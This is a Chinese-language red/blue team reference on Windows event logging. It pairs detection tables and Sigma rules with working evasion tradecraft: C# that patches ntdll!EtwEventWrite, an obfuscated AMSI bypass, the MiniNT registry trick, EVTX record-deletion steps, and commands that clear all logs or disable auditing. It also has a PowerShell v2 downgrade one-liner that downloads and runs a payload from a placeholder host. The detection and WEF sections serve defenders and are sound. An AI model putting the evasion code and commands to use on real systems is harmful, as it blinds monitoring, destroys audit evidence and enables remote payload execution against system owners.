# Windows Event Log 红蓝对抗完整参考

> 理解日志机制才能有效规避；理解规避手段才能有效检测

---

## 一、关键 Event ID 速查表

### 1.1 Security 日志

| Event ID | 类别 | 含义 | 红队触发动作 | 检测优先级 |
|----------|------|------|-------------|-----------|
| 1102 | 审计 | 安全日志被清除 | 日志清除 | 极高 |
| 4624 | 登录 | 登录成功 | PTH/PTT/RDP/PsExec | 高 |
| 4625 | 登录 | 登录失败 | 密码喷洒/暴力破解 | 高 |
| 4634 | 登录 | 注销 | - | 低 |
| 4648 | 登录 | 显式凭据登录 | runas/PsExec/mimikatz PTH | 高 |
| 4672 | 登录 | 特权令牌分配 | 管理员登录/提权 | 中 |
| 4688 | 进程 | 新进程创建 | 任何工具执行 | 中 |
| 4689 | 进程 | 进程退出 | - | 低 |
| 4697 | 系统 | 服务安装 | 持久化/PsExec | 高 |
| 4698 | 计划任务 | 计划任务创建 | 持久化/横向 | 高 |
| 4699 | 计划任务 | 计划任务删除 | 痕迹清除 | 高 |
| 4702 | 计划任务 | 计划任务更新 | 持久化修改 | 中 |
| 4720 | 用户 | 用户账户创建 | 后门账户 | 极高 |
| 4722 | 用户 | 用户账户启用 | 启用禁用账户 | 高 |
| 4724 | 用户 | 重置密码 | 接管账户 | 高 |
| 4728 | 组 | 用户添加到安全组 | 提权 | 高 |
| 4732 | 组 | 用户添加到本地组 | 添加到管理员组 | 极高 |
| 4768 | Kerberos | TGT 请求 (AS-REQ) | AS-REP Roasting | 中 |
| 4769 | Kerberos | 服务票据请求 (TGS-REQ) | Kerberoasting | 中 |
| 4771 | Kerberos | Kerberos 预认证失败 | 密码喷洒 | 高 |
| 4776 | NTLM | NTLM 认证 | PTH | 中 |
| 5140 | 共享 | 网络共享访问 | 横向移动 | 中 |
| 5145 | 共享 | 共享对象访问检查 | 横向移动详情 | 中 |
| 5156 | 防火墙 | 允许网络连接 | C2 出站 | 低 |
| 5157 | 防火墙 | 拒绝网络连接 | 端口扫描 | 中 |

### 1.2 4624 登录类型详解

| Logon Type | 含义 | 红队场景 |
|-----------|------|---------|
| 2 | 交互式登录 | 本地 console/RDP |
| 3 | 网络登录 | SMB/PsExec/WMI/WinRM |
| 4 | 批处理 | 计划任务执行 |
| 5 | 服务 | 服务启动 |
| 7 | 解锁 | 屏幕解锁 |
| 8 | NetworkCleartext | IIS Basic Auth |
| 9 | NewCredentials | runas /netonly |
| 10 | RemoteInteractive | RDP |
| 11 | CachedInteractive | 离线登录（缓存凭据） |

### 1.3 System 日志

| Event ID | 含义 | 红队触发 |
|----------|------|---------|
| 104 | 日志被清除 | 日志清除 |
| 6005 | Event Log 服务启动 | 系统重启 |
| 6006 | Event Log 服务停止 | 系统关闭 |
| 7034 | 服务异常终止 | 杀掉服务 |
| 7036 | 服务启动/停止 | 服务操作 |
| 7040 | 服务启动类型更改 | 禁用服务 |
| 7045 | 新服务安装 | 持久化/PsExec |

### 1.4 Sysmon 日志 (Microsoft-Windows-Sysmon/Operational)

| Event ID | 含义 | 红队触发 | 检测优先级 |
|----------|------|---------|-----------|
| 1 | 进程创建（含哈希/父进程/命令行） | 所有工具执行 | 高 |
| 2 | 文件创建时间修改 | Timestomping | 极高 |
| 3 | 网络连接 | C2 通信 | 高 |
| 5 | 进程终止 | - | 低 |
| 6 | 驱动加载 | Rootkit/驱动 | 高 |
| 7 | 镜像加载（DLL） | DLL 侧加载 | 中 |
| 8 | CreateRemoteThread | 进程注入 | 极高 |
| 9 | RawAccessRead | 直接磁盘读取 | 高 |
| 10 | ProcessAccess | LSASS dump | 极高 |
| 11 | 文件创建 | 工具落盘/Payload | 高 |
| 12 | 注册表对象创建/删除 | 持久化 | 中 |
| 13 | 注册表值设置 | 持久化/配置 | 中 |
| 15 | FileCreateStreamHash | ADS 创建 | 高 |
| 17 | 命名管道创建 | C2 通信/PsExec | 高 |
| 18 | 命名管道连接 | 横向移动 | 高 |
| 22 | DNS 查询 | C2 域名解析 | 中 |
| 23 | 文件删除（含存档） | 痕迹清除 | 中 |
| 25 | 进程篡改 | Process Hollowing | 极高 |
| 26 | 文件删除日志 | 文件删除记录 | 中 |

### 1.5 PowerShell 日志

| Event ID | 日志源 | 含义 | 红队触发 |
|----------|--------|------|---------|
| 400 | Windows PowerShell | 引擎启动 | PS 使用 |
| 403 | Windows PowerShell | 引擎停止 | PS 退出 |
| 4103 | PowerShell/Operational | 模块日志 | 命令执行 |
| 4104 | PowerShell/Operational | 脚本块日志 | 脚本内容记录 |
| 4105 | PowerShell/Operational | 脚本块开始 | 脚本执行 |
| 4106 | PowerShell/Operational | 脚本块结束 | 脚本完成 |
| 53504 | PowerShell/Operational | AMSI 记录 | 可疑脚本检测 |

```
⛔ 4104 ScriptBlock Logging 特别危险：
├─ 即使使用 -EncodedCommand，解码后的完整脚本内容会被记录
├─ Invoke-Mimikatz 等工具的完整代码会出现在日志中
├─ 甚至混淆后的脚本也会在反混淆后被记录（AMSI 集成）
└─ 这是蓝队最强大的 PowerShell 检测手段
```

---

## 二、SIEM 检测规则示例 (Sigma 格式)

### 2.1 检测 Credential Dumping (LSASS 访问)

```yaml
title: LSASS Memory Access (Credential Dumping)
status: stable
logsource:
    product: windows
    service: sysmon
detection:
    selection:
        EventID: 10
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1010'    # PROCESS_VM_READ + PROCESS_QUERY_LIMITED_INFORMATION
            - '0x1410'    # + PROCESS_QUERY_INFORMATION
            - '0x1438'    # Full memory read access
            - '0x1fffff'  # PROCESS_ALL_ACCESS
    filter_known:
        SourceImage|endswith:
            - '\wmiprvse.exe'
            - '\taskmgr.exe'
            - '\MsMpEng.exe'        # Defender
            - '\csrss.exe'
    condition: selection and not filter_known
level: critical
```

### 2.2 检测 PsExec 横向移动

```yaml
title: PsExec Service Installation
status: stable
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
        ServiceName|contains:
            - 'PSEXESVC'
            - 'psexec'
    condition: selection
level: high
---
# 更通用的检测: 远程服务安装
title: Suspicious Remote Service Installation
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7045
    filter_legitimate:
        ServiceName|contains:
            - 'Windows'
            - 'Microsoft'
            - 'vmtools'
    condition: selection and not filter_legitimate
level: medium
```

### 2.3 检测 Pass-the-Hash

```yaml
title: Pass-the-Hash Detection
status: stable
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 9              # NewCredentials
        LogonProcessName: 'seclogo'
        AuthenticationPackageName: 'Negotiate'
    condition: selection
level: high
---
# NTLM 认证异常
title: NTLM Authentication from Unusual Source
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4776
        Status: '0x0'             # 成功
    filter:
        PackageName: 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0'
    condition: selection
level: medium
```

### 2.4 检测日志清除

```yaml
title: Security Event Log Cleared
status: stable
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 1102
    condition: selection
level: critical
---
title: System Event Log Cleared
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 104
    condition: selection
level: critical
```

### 2.5 检测 PowerShell 攻击工具

```yaml
title: Malicious PowerShell Script Block
status: stable
logsource:
    product: windows
    service: powershell-script
detection:
    selection:
        EventID: 4104
    keywords:
        ScriptBlockText|contains:
            - 'Invoke-Mimikatz'
            - 'Invoke-Expression'
            - 'IEX'
            - 'Net.WebClient'
            - 'DownloadString'
            - 'DownloadFile'
            - 'Start-Process'
            - 'Invoke-Shellcode'
            - 'Invoke-DllInjection'
            - 'Get-GPPPassword'
            - 'Get-Keystrokes'
            - 'Get-TimedScreenshot'
            - '-bxor'
            - 'AmsiUtils'
            - 'amsiInitFailed'
            - 'Reflection.Assembly'
    condition: selection and keywords
level: high
```

### 2.6 检测 Kerberoasting

```yaml
title: Kerberoasting Activity
status: stable
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'   # RC4-HMAC（弱加密，Kerberoast 特征）
        TicketOptions: '0x40810000'
    filter:
        ServiceName|endswith: '$'       # 排除机器账户
    condition: selection and not filter
level: high
```

---

## 三、ETW (Event Tracing for Windows) 架构

### 3.1 ETW 基本架构

```
ETW 架构三要素：
├─ Provider（事件源）→ 产生事件的组件
│   ├─ Microsoft-Windows-Security-Auditing
│   ├─ Microsoft-Windows-Sysmon
│   ├─ Microsoft-Windows-PowerShell
│   ├─ Microsoft-Antimalware-Scan-Interface (AMSI)
│   └─ 每个 Provider 有唯一 GUID
│
├─ Session（会话）→ 事件的传输通道
│   ├─ EventLog-Security → 安全日志
│   ├─ EventLog-System → 系统日志
│   ├─ Eventlog-Microsoft-Windows-Sysmon → Sysmon
│   └─ 自定义 Session → EDR 产品的监控通道
│
└─ Consumer（消费者）→ 接收并处理事件
    ├─ Event Log Service (svchost.exe -k netsvcs)
    ├─ EDR Agent
    ├─ SIEM Forwarder
    └─ 自定义消费者
```

### 3.2 ETW 关键命令

```cmd
:: 列出所有活跃 ETW Session
logman query -ets

:: 列出所有已注册的 ETW Provider
logman query providers

:: 查看特定 Session 的详情
logman query "EventLog-Security" -ets

:: 查看 Provider 被哪些 Session 使用
logman query providers "Microsoft-Windows-Security-Auditing"

:: 列出 Sysmon 的 ETW Provider GUID
logman query providers | findstr -i sysmon
```

### 3.3 红队: ETW 致盲技术

#### 方法 1: Patch ntdll!EtwEventWrite

```
原理：所有 ETW 事件最终通过 ntdll!EtwEventWrite 发送
Patch 该函数开头为 ret → 所有 ETW 事件静默失败

步骤：
1. 获取 ntdll!EtwEventWrite 地址
2. 修改内存保护为 RWX
3. 写入 0xC3 (ret) 到函数入口
4. 恢复内存保护

影响范围：当前进程的所有 ETW 事件不再产生
├─ PowerShell ScriptBlock Logging → 无效
├─ AMSI → 无效
├─ .NET ETW → 无效
└─ 注意：只影响当前进程，不影响其他进程
```

```csharp
// C# 实现示例（分析用途）
// 获取 EtwEventWrite 地址
var ntdll = GetModuleHandle("ntdll.dll");
var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");

// Patch: mov eax, 0; ret
byte[] patch = { 0x33, 0xC0, 0xC3 };  // xor eax,eax; ret
VirtualProtect(etwAddr, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
Marshal.Copy(patch, 0, etwAddr, patch.Length);
VirtualProtect(etwAddr, (UIntPtr)patch.Length, oldProtect, out _);
```

#### 方法 2: Patch 特定 ETW Provider

```
原理：每个 Provider 有 _TlgKeyword 和 IsEnabled 字段
将 Provider 的 ProviderMetadata 中的 IsEnabled 设为 0

优势：比 Patch EtwEventWrite 更精准，只禁用目标 Provider
└─ 例：只禁用 AMSI Provider，不影响其他监控
```

#### 方法 3: 移除 ETW Session 的 Provider

```cmd
:: 从 Session 中移除 Provider（需管理员）
logman update trace "EventLog-Security" -p "Microsoft-Windows-Security-Auditing" --ets -rt

:: ⛔ 注意：这会影响所有使用该 Session 的 Consumer
:: 且修改 ETW Session 本身可能被 EDR 监控
```

#### 方法 4: 内核级 ETW 致盲

```
对于 Sysmon 等内核级 ETW Consumer：
├─ 方法 A: 卸载 Sysmon 驱动（fltMC unload SysmonDrv）→ 需 admin
├─ 方法 B: Patch 内核中的 ETW callback
│   修改 nt!EtwpEventCallback 数组 → 移除 Sysmon 回调
├─ 方法 C: 通过漏洞加载自签名驱动 → 直接修改内核
└─ 方法 D: Sysmon 配置文件操控
    修改 Sysmon 的 XML 配置 → 减少监控范围
```

---

## 四、停止/致盲 EventLog 服务

### 4.1 Invoke-Phant0m

```
原理：不直接停止 EventLog 服务（会产生 7034/7036），而是杀掉服务进程内的所有工作线程

流程：
1. 找到 EventLog 服务的宿主进程（svchost.exe -k netsvcs -p）
2. 枚举该进程的所有线程
3. 识别属于 EventLog 服务的线程（通过 DLL: wevtsvc.dll）
4. 终止这些线程: TerminateThread()

效果：
├─ EventLog 服务状态显示 "Running"（SCM 认为服务正常）
├─ 但实际工作线程已死 → 不再写入任何日志
├─ 不产生 EventID 7034/7036
└─ 重启服务或重启系统后恢复
```

```powershell
# Invoke-Phant0m 核心逻辑（分析用途）
# Step 1: 获取 EventLog 服务 PID
$svcPid = (Get-WmiObject Win32_Service | Where-Object { $_.Name -eq 'EventLog' }).ProcessId

# Step 2: 枚举进程中的线程
# Step 3: 对每个线程检查是否属于 wevtsvc.dll
# Step 4: TerminateThread

# 检测方法（蓝队）：
# - 监控 Thread termination in svchost
# - 检查 EventLog 服务的线程数是否为 0
# - Sysmon EID 1 检测 Invoke-Phant0m 执行
```

### 4.2 MiniNT 注册表键

```cmd
:: 原理：Windows 在安装模式（MiniNT/WinPE）下不记录事件日志
:: 创建 MiniNT 键 → 欺骗系统认为处于安装模式

reg add "HKLM\SYSTEM\CurrentControlSet\Control\MiniNT" /f

:: 效果：
:: - 重启后 EventLog 服务不再记录事件
:: - 服务仍然运行但不产生日志
:: - 需要删除该键并重启才能恢复

:: 清除
reg delete "HKLM\SYSTEM\CurrentControlSet\Control\MiniNT" /f

:: ⛔ 检测方法（蓝队）：
:: - 监控 HKLM\SYSTEM\CurrentControlSet\Control\MiniNT 的创建
:: - Sysmon EID 12/13: 注册表键创建/修改
:: - 定期检查该键是否存在
```

### 4.3 直接终止 EventLog 服务线程（API 方式）

```
使用 NtQueryInformationThread + NtTerminateThread：
1. OpenProcess(EventLog svchost PID)
2. 遍历系统线程列表（NtQuerySystemInformation）
3. 对每个线程: NtQueryInformationThread → 获取 TEB → 检查加载模块
4. 如果线程的起始地址在 wevtsvc.dll 范围内 → NtTerminateThread

API 调用链（避免 hook）：
├─ 使用直接 syscall（SysWhispers3）避免 EDR inline hook
├─ 或使用 indirect syscall 避免检测
└─ 不调用 TerminateThread（被 hook），直接 NtTerminateThread
```

### 4.4 停止 EventLog 的其他方式

```cmd
:: 方式 1: 直接停止服务（会产生 Event 7036 — 不推荐）
net stop eventlog
sc stop eventlog

:: 方式 2: 禁用服务（重启后生效）
sc config eventlog start= disabled

:: 方式 3: 修改日志文件权限（拒绝 SYSTEM 写入）
:: 日志文件位置: C:\Windows\System32\winevt\Logs\
icacls C:\Windows\System32\winevt\Logs\Security.evtx /deny "SYSTEM:(W)"

:: 方式 4: 修改审计策略（减少记录范围）
auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
auditpol /set /category:"Object Access" /success:disable /failure:disable

:: 查看当前审计策略
auditpol /get /category:*
```

---

## 五、精准日志编辑

### 5.1 EVTX 文件结构

```
.evtx 文件结构：
├─ File Header (4096 bytes / 1 chunk)
│   ├─ Signature: "ElfFile\x00"
│   ├─ First/Last Chunk Number
│   ├─ Next Record ID
│   ├─ Header Size: 128 bytes
│   ├─ Checksum (CRC32 of first 120 bytes)
│   └─ Flags
│
├─ Chunk (65536 bytes each)
│   ├─ Chunk Header (512 bytes)
│   │   ├─ Signature: "ElfChnk\x00"
│   │   ├─ First/Last Event Record Number
│   │   ├─ First/Last Event Record ID
│   │   ├─ Event Records Checksum
│   │   ├─ String table (common strings cache)
│   │   └─ Template table (BinXML templates)
│   │
│   └─ Event Records (variable size)
│       ├─ Signature: 0x00002A2A ("**")
│       ├─ Record Size
│       ├─ Record Number
│       ├─ Timestamp (FILETIME)
│       └─ BinXML content (event data)
│
└─ 校验和机制：
    ├─ File Header CRC32
    ├─ Chunk Header CRC32
    └─ Event Records CRC32 (in Chunk Header)
```

### 5.2 精准删除工具

#### Danderspritz eventlogedit (NSA Equation Group)

```
ShadowBrokers 泄露的 NSA 工具，最精确的日志编辑方案：

功能：
├─ 按 Event ID / 时间范围 / 关键字 精准删除记录
├─ 自动修复 Chunk 内的 Record Number 连续性
├─ 重新计算所有校验和（File Header + Chunk Header + Records）
├─ 处理 String Table 和 Template Table 引用
└─ 删除后文件结构完全合法 → 标准工具无法检测

⛔ 检测方法：
├─ 对比日志和 SIEM 中的副本 → Record ID 不连续
├─ 对比 $UsnJrnl 中 .evtx 文件的修改时间
└─ 统计分析：特定时间段的事件密度异常下降
```

#### EvtxHussar / evtx-hunter

```bash
# EvtxHussar — 开源 EVTX 解析器，可用于分析文件结构
python3 evtxhussar.py -f Security.evtx

# evtx_edit — 社区工具，精准删除指定记录
# 流程：
# 1. 解析 evtx 文件 → 找到目标记录所在 Chunk
# 2. 从 Chunk 中移除目标记录
# 3. 调整后续 Record 的偏移
# 4. 重新计算 Chunk CRC32 和 Records CRC32
# 5. 更新 File Header 的计数器和 CRC32
```

#### 手动编辑流程

```
精准删除单条记录的步骤：
1. 停止 EventLog 服务（或终止其线程）
   → 释放 .evtx 文件锁

2. 备份原始文件
   copy Security.evtx Security.evtx.bak

3. 解析文件找到目标记录
   → 按 Chunk 遍历 → 在 Chunk 内遍历 Records
   → 匹配 Record Number / Timestamp / EventID

4. 删除记录
   → 将目标 Record 之后的数据前移
   → 或用 0x00 覆盖目标 Record（简单但会留下空洞）

5. 修复校验和
   → 重新计算 Chunk Header 中的 Event Records CRC32
   → 重新计算 Chunk Header CRC32
   → 更新 File Header 中的 Next Record ID
   → 重新计算 File Header CRC32

6. 恢复 EventLog 服务

⛔ 如果不修复校验和 → Event Viewer 可能报错 / 取证工具会检测到篡改
```

### 5.3 日志清除（非精准方式）

```cmd
:: wevtutil 清除特定日志（产生 EventID 1102/104）
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Windows PowerShell"

:: 清除所有日志
for /f "tokens=*" %i in ('wevtutil el') do wevtutil cl "%i" 2>nul

:: PowerShell 清除
Get-WinEvent -ListLog * | ForEach-Object { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) }

:: ⛔ 清除操作本身会产生:
:: Security 日志: EventID 1102
:: System 日志: EventID 104
:: 这两个事件在 SIEM 中通常是最高优先级告警！
```

---

## 六、PowerShell 日志绕过

### 6.1 AMSI (Antimalware Scan Interface) Bypass

```
AMSI 工作流程：
1. PowerShell 引擎接收脚本
2. 调用 AmsiScanBuffer() 将内容发送给注册的安全提供商（如 Defender）
3. 安全提供商返回扫描结果
4. 如果恶意 → 阻止执行 + 记录日志（EventID 53504）
5. 如果安全 → 允许执行

绕过目标：阻止 AmsiScanBuffer() 正常工作
```

#### 方法 A: Patch amsi.dll

```
原理：Patch AmsiScanBuffer 或 AmsiOpenSession 返回错误码

AmsiScanBuffer patch（最常见）：
1. 获取 amsi.dll 中 AmsiScanBuffer 的地址
2. 修改内存保护 → RWX
3. 在函数开头写入: mov eax, 0x80070057; ret (E_INVALIDARG)
4. 所有后续 AMSI 扫描返回 "参数无效" → 不扫描

AmsiOpenSession patch（替代方案）:
1. Patch AmsiOpenSession 立即返回失败
2. AMSI 会话无法建立 → 后续扫描全部跳过

⛔ 注意：Patch 本身可能被 AMSI 检测（鸡生蛋问题）
解决：对 Patch 代码进行混淆/编码/拆分
```

#### 方法 B: amsiInitFailed 强制失败

```powershell
# 经典一行 bypass（分析用途，原始形式已被签名检测）
# 设置 AmsiUtils 类的 amsiInitFailed 字段为 True
# → PowerShell 认为 AMSI 初始化失败 → 跳过所有扫描

# 混淆变体（绕过字符串检测）:
$a=[Ref].Assembly.GetTypes()
$b=$a | Where-Object { $_.Name -like '*siUtils' }
$c=$b.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*InitFailed' }
$c.SetValue($null,$true)
```

#### 方法 C: 反射 DLL unhook

```
原理：重新加载干净的 amsi.dll 覆盖被 hook 的版本
1. 从磁盘读取原始 amsi.dll
2. 映射到内存
3. 将 .text 段复制到当前进程中 amsi.dll 的对应位置
→ 恢复原始代码 → 但之前的 patch 也会被恢复

用途：配合自定义 AMSI provider → 让 provider 始终返回 "安全"
```

### 6.2 PowerShell 降级攻击

```cmd
:: PowerShell v2 不支持 ScriptBlock Logging / AMSI
:: 如果系统安装了 .NET Framework 2.0/3.5 → 可以使用 PS v2

powershell -version 2 -Command "IEX (New-Object Net.WebClient).DownloadString('http://x.x/payload.ps1')"

:: 检查 PS v2 是否可用
reg query "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
:: 如果 .NET 3.5 已安装 → v2 可用

:: ⛔ 检测方法（蓝队）：
:: EventID 400: EngineVersion=2.0 → 降级攻击
:: 对策: 卸载 .NET Framework 2.0/3.5（如果不需要）
:: 或监控 PowerShell v2 引擎启动
```

### 6.3 .NET 直接调用（绕过 PowerShell 引擎）

```
原理：PowerShell 日志（4103/4104）由 PS 引擎产生
不使用 PowerShell → 不产生 PS 日志

方法：
├─ C# 编译执行 → 直接调用 .NET Framework API
│   通过 System.Management.Automation 命名空间调用 PS 功能
│   但不触发 ScriptBlock Logging
│
├─ Runspace 直接创建
│   用 C# 创建 PowerShell Runspace → 执行命令
│   不走 powershell.exe → 不触发 PS 进程日志
│
├─ Add-Type 内联 C#
│   在 PS 中编译 C# 代码执行 → C# 部分不受 ScriptBlock Logging
│
└─ 使用其他 .NET 语言（F#, VB.NET）
    不经过 PowerShell 引擎 → 无 PS 日志
```

### 6.4 Constrained Language Mode 绕过

```powershell
# 查看当前语言模式
$ExecutionContext.SessionState.LanguageMode

# FullLanguage → 无限制
# ConstrainedLanguage → 受限（AppLocker/WDAC 开启时）
# RestrictedLanguage → 高度受限
# NoLanguage → 禁用脚本

# 绕过 ConstrainedLanguage:
# 方法 1: 使用 PowerShell v2（无 CLM）
# 方法 2: 使用 InstallUtil/MSBuild 等 LOLBAS 执行 .NET 代码
# 方法 3: 通过自定义 Runspace 创建 FullLanguage 会话
# 方法 4: 利用 __PSLockdownPolicy 环境变量（不可靠）
```

---

## 七、检测日志篡改（蓝队防御）

### 7.1 日志完整性验证

```
防御策略：
├─ 实时转发到 SIEM → 即使本地日志被删除/修改，SIEM 有副本
├─ 日志签名 → Windows Event Forwarding (WEF) + 哈希校验
├─ 监控关键事件：
│   ├─ EventID 1102 / 104 → 日志清除
│   ├─ EventID 7036 (EventLog service stopped) → 服务停止
│   ├─ Sysmon EID 12/13 → MiniNT 键创建
│   ├─ auditpol 变更 → 审计策略修改
│   └─ .evtx 文件的 MACE 时间戳异常 → 文件被修改
├─ 日志缺口检测：
│   ├─ Record ID 连续性检查
│   ├─ 时间段事件密度分析
│   └─ 心跳事件（自定义定时写入 → 缺失 = 日志中断）
└─ Canary 日志：
    定期写入特征事件 → 被删除 = 有人清理日志
```

### 7.2 Windows Event Forwarding (WEF) 配置

```cmd
:: 配置日志转发到中心收集器（最佳防御 — 攻击者无法修改远程副本）
:: Collector 端：
winrm quickconfig
wecutil qc

:: Subscription 示例（收集关键安全事件）：
:: 创建 subscription XML 包含:
:: - Security: 4624,4625,4648,4672,4688,4720,4728,1102
:: - System: 7045,7036
:: - Sysmon: 1,3,8,10,11
:: - PowerShell: 4104

:: ⛔ WEF 是对抗日志清除的最有效手段
:: 攻击者即使获得本地 SYSTEM 权限也无法修改已转发的日志
```

---

## 八、审计策略配置参考

### 蓝队推荐的审计策略

```cmd
:: 启用完整审计（检测能力最大化）
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Special Logon" /success:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Logoff" /success:enable
auditpol /set /subcategory:"Account Lockout" /failure:enable
auditpol /set /subcategory:"Security Group Management" /success:enable
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable
auditpol /set /subcategory:"Security System Extension" /success:enable
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable
auditpol /set /subcategory:"Detailed File Share" /success:enable /failure:enable

:: 启用进程创建命令行记录（4688 包含命令行参数）
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f

:: 启用 PowerShell 脚本块日志
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 1 /f

:: 启用 PowerShell 模块日志
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 1 /f
```

### 红队: 检查审计策略（决定绕过策略）

```cmd
:: 查看当前审计策略
auditpol /get /category:*

:: 查看 PowerShell 日志配置
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"

:: 查看 Sysmon 是否安装
sc query sysmon
sc query sysmon64
fltmc | findstr sysmon

:: 查看 Sysmon 配置（如果可读）
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv\Parameters"

:: ⛔ 根据环境选择绕过策略：
:: 无 Sysmon → 只需处理 Security/PowerShell 日志
:: 有 Sysmon → 需额外处理 Sysmon 日志或绕过 Sysmon
:: 有 EDR → 需考虑用户态 hook + 内核回调
:: 有 SIEM → 本地清除无效，必须从源头阻止日志产生
```
